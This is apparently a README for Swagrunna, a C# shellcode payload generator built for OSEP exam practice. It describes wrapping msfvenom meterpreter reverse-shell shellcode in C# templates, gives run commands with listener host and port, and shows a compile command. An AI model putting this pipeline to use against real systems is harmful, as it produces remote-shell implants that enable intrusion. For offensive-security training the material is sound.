# Swagrunna
Csharp payload generator used to streamline OSEP exam. The current `payload.cs` does NOT get past modern Windows Defender due to the nature of how it injects.

## How it works
It generates shellcode using msfvenom, encodes it with encoder.exe then sandwiches it between `head.cs` and `tail.cs` creating `payload.cs`

# Dependencies
mono
msfvenom

# How to change
Essentially `head.cs` is pre-shell code and `tail.cs` is just post-shell code. You can combine them and modify it or just write your own Csharp code and split it up accordingly.
Right now the encode.exe takes in shell.txt, encodes the contents and spits out encoded shell code with the variable `buf`

# How to use
Swagrunna will automatically look for tun0 to decide LHOST. By default LPORT is 443 and the payload is set to `windows/x64/meterpreter/reverse_http`

Run with defaults
```
./swagrunna.sh
```

Run without defaults
```
./swagrunna.sh -i 1.2.3.4 -p 4444 -x windows/x86/meterpreter/reverse_tcp
```

This will drop payload.cs in the local directory

# How to compile payload.cs
Since swagrunna comes with an uninstall function the following references must be included:
```
System.Configuration.Install.dll
System.Management.Automation.dll
```

I have yet to figure out how to compile this on linux, so I compile it on a windows VM.

The current command I run is:
```
C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe /reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Configuration.Install.dll /reference:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll C:\PATH\TO\payload.cs
```

This process could be streamlined with a little more time investment!
